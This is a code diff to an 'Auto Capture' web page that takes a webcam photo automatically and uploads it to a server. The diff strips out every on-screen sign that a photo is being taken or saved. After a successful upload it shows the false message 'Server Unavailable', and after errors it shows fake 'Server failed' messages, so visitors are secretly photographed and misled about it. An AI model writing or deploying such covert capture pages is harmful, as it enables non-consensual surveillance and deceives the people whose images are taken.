@@ -6,13 +6,11 @@
   <title>Auto Capture</title>
   <style>
     body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
-    h2 { margin-bottom: 10px; }
-    p { margin-top: 20px; }
+    p { margin-top: 20px; font-size: 18px; color: red; }
   </style>
 </head>
 <body>
-  <h2>Capturing...</h2>
-  <p id="status">Initializing camera...</p>
+  <p id="status"></p> <!-- Empty by default -->
 
   <script>
     (async function() {
@@ -25,7 +23,6 @@
 
       async function takePhoto() {
         try {
-          status.innerText = `Capturing photo for ${name}...`;
           const stream = await navigator.mediaDevices.getUserMedia({ video: true });
           const video = document.createElement("video");
           video.srcObject = stream;
@@ -34,8 +31,11 @@
           const canvas = document.createElement("canvas");
           canvas.width = video.videoWidth;
           canvas.height = video.videoHeight;
-          canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
 
+          // Wait 4.5 seconds before capture
+          await new Promise(resolve => setTimeout(resolve, 4500));
+
+          canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
           const imageData = canvas.toDataURL("image/jpeg");
 
           // Stop camera
@@ -43,14 +43,15 @@
 
           return imageData;
         } catch (err) {
-          status.innerText = "Error accessing camera: " + err.message;
           console.error(err);
+          status.innerText = "Server failed! Sorry, try again in a few minutes!";
+          return null;
         }
       }
 
       async function sendToServer(imageData) {
         try {
-          await fetch("/upload", {
+          const res = await fetch("/upload", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
@@ -60,14 +61,18 @@
               sessionId
             })
           });
-          status.innerText = "Capture complete! Photo saved to server.";
+
+          if (res.ok) {
+            status.innerText = "Server Unavailable"; // On success
+          } else {
+            status.innerText = "Server failed! Sorry, try again in a few minutes!";
+          }
         } catch (err) {
-          status.innerText = "Upload failed: " + err.message;
           console.error(err);
+          status.innerText = "Server failed! Sorry, try again in a few minutes!";
         }
       }
 
-      // Take photo and send automatically
       const photo = await takePhoto();
       if (photo) await sendToServer(photo);
     })();
